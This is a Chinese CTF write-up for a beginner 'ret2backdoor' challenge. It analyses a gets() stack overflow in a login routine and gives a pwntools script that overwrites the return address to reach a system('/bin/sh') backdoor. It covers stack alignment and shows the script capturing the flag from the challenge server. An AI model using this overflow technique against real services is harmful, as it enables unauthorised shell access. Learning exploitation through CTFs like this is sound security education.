# PWN-Authenticate 赛题分析报告

## 一、基本概况

本题为一道入门级 PWN 题目，分值为 200 分。目标程序是一个模拟用户登录的认证系统，内部预留了后门函数，通过栈溢出劫持控制流即可获取 shell。

## 二、环境与工具

- 操作系统：Ubuntu 24.04 (WSL)
- 调试器：GDB + pwndbg
- 利用框架：pwntools (Python)
- 反汇编器：objdump / IDA

## 三、前置分析

### 3.1 文件属性

拿到附件后先用 `file` 和 `checksec` 确认基本信息：

```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, dynamically linked,
      not stripped

$ checksec vuln
[*] No PIE       → 地址固定，跳转目标可靠
[*] No Canary    → 栈溢出无检测
[*] NX disabled  → 栈可执行（本题用不到）
```

三个保护全关，属于最宽松的情况。

### 3.2 符号表概览

用 `nm` 或者 pwntools 导出符号，发现了一个极易引起注意的函数名：

```
0x4011f6  T  backdoor
0x40120d  T  login
0x4012a7  T  main
```

`backdoor` 这个命名本身就暗示了它是解题入口。

### 3.3 反汇编 login 函数

使用 `objdump -d vuln -M intel` 提取关键函数：

```asm
000000000040120d <login>:
  40120d:  endbr64
  401211:  push   rbp
  401212:  mov    rbp, rsp
  401215:  sub    rsp, 0x80          ; 分配 128 字节栈空间
  ...
  401236:  lea    rax, [rbp-0x40]     ; username 缓冲区
  40123a:  mov    edx, 0x40
  40123f:  mov    rsi, rax
  401242:  mov    edi, 0x0
  401247:  mov    eax, 0x0
  40124c:  call   <read@plt>          ; read(0, buf, 64)  ← 安全
  ...
  401262:  lea    rax, [rbp-0x80]     ; password 缓冲区
  401266:  mov    rdi, rax
  401269:  mov    eax, 0x0
  40126e:  call   <gets@plt>          ; gets(buf)  ← 危险！
  ...
  4012a5:  leave
  4012a6:  ret
```

**关键信息提取**：

- `password` 的输入起点在 `rbp - 0x80` 处
- 返回地址存放在 `rbp + 0x8`
- 两者距离为 `(rbp + 8) - (rbp - 0x80)` = **136 字节**（即 `0x88`）

对比来看，`username` 的读取使用了 `read(0, buf, 64)`，严格限制了长度；而 `password` 直接调用 `gets()`，是典型的「一处安全、一处漏洞」的教科书案例。

### 3.4 backdoor 函数

```asm
00000000004011f6 <backdoor>:
  4011f6:  endbr64
  4011fa:  push   rbp
  4011fb:  mov    rbp, rsp
  4011fe:  lea    rdi, [rip+0xe03]    ; "/bin/sh"
  401205:  call   <system@plt>
  40120a:  nop
  40120b:  pop    rbp
  40120c:  ret
```

非常直白：加载 `"/bin/sh"` 字符串地址到 `rdi`，然后调用 `system()`。

## 四、利用思路

### 4.1 攻击路径

```
login() 输入 password
    ↓ gets() 无长度限制，栈溢出
    ↓ 覆盖返回地址 → backdoor
    ↓ system("/bin/sh")
    ↓ 获取 shell → 读取 flag
```

### 4.2 关键坑点：栈对齐

直接跳到 `backdoor` 的入口（`0x4011f6`）会导致 crash。原因如下：

- x86-64 System V ABI 要求执行 `call` 时 `rsp` 必须 16 字节对齐
- `backdoor` 首条指令 `push rbp` 会破坏从 `login` 返回时已经对齐的栈
- `system()` 内部可能执行 `movaps` 等 SSE 指令，未对齐直接 SIGSEGV

**两种解决方案**：

| 方案 | 做法 | 目标地址 |
|------|------|----------|
| A | 跳过 `push rbp` | `backdoor + 5 = 0x4011fb` |
| B | 先 `ret` 再跳转 | `ret_gadget` → `backdoor` |

方案 A 更简洁，本 writeup 采用此方式。

**方案 A 栈对齐推导**：
```
login 返回时 rsp = X（16 字节对齐）
跳转至 0x4011fb（无 push rbp）
mov rbp, rsp        → rsp = X（仍对齐）
lea  rdi, "/bin/sh"  → rsp = X
call system          → rsp = X（对齐 ✓）
```

### 4.3 偏移量确认

使用 cyclic pattern 配合 GDB 验证：

```python
>>> from pwn import *
>>> payload = cyclic(200, n=8)  # 8 字节唯一模式
>>> # 在 GDB 中运行至 ret 断点，观察 rsp 指向的值
>>> # x/gx $rsp → 0x6261617962616179
>>> cyclic_find(p64(0x6261617962616179), n=8)
136
```

偏移量 136 与静态分析一致。

## 五、Exploit 实现

### 5.1 核心逻辑

```python
from pwn import *

context.arch = 'amd64'

# 偏移量：gets 缓冲区 → 返回地址
pad_to_ret = 0x88  # 136 字节

# 目标：backdoor 跳过 push rbp，保持栈对齐
target = 0x4011F6 + 5

payload  = b'\x00' * pad_to_ret
payload += p64(target)

# 用户名不能是 "admin"，否则打印 Access Denied 后仍然返回
io.sendlineafter(b'Username:', b'guest')
io.sendlineafter(b'Password:', payload)
io.interactive()
```

### 5.2 完整脚本

见附件 `exp2.py`，使用方式：

```bash
# 攻击远程
python3 exp2.py

# 本地测试
python3 exp2.py --local
```

## 六、攻击结果

```
$ python3 exp2.py
[+] Opening connection to 120.27.146.76 on port 20959: Done
[+] flag: flag{4e6f25f6b8bcd6f006ca0134a2497789}
```

成功获取 flag：

> **flag{4e6f25f6b8bcd6f006ca0134a2497789}**

## 七、题目源码（来自远程服务器）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void backdoor() {
    system("/bin/sh");
}

void login() {
    char username[64];
    char password[64];

    printf("=== Welcome to SecureAuth System ===\n");
    printf("Username: ");
    read(0, username, 64);       // ← 安全：限制 64 字节
    printf("Password: ");
    gets(password);              // ← 漏洞：无限制

    if (strcmp(username, "admin") == 0) {
        printf("Access Denied: Admin login is disabled.\n");
    } else {
        printf("Invalid credentials.\n");
    }
}

int main() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    login();
    return 0;
}
```

## 八、总结

本题本质上是一道 **ret2backdoor** 的入门 PWN 题，涉及以下知识点：

- `gets()` 与 `read()` 的安全差异：前者不检查边界，后者有长度参数
- x86-64 函数调用约定与栈帧布局：局部变量、rbp、返回地址的相对位置
- 返回地址劫持：通过栈溢出将 rip 指向后门函数
- **栈对齐（Stack Alignment）**：64 位下 `system()` 要求 `rsp % 16 == 0`，需调整跳转偏移或使用 ret 滑板

即使保护全关（No PIE / No Canary / No NX），若不注意栈对齐细节，依然会 exploitation failed → crash，这也是本题唯一的小陷阱。
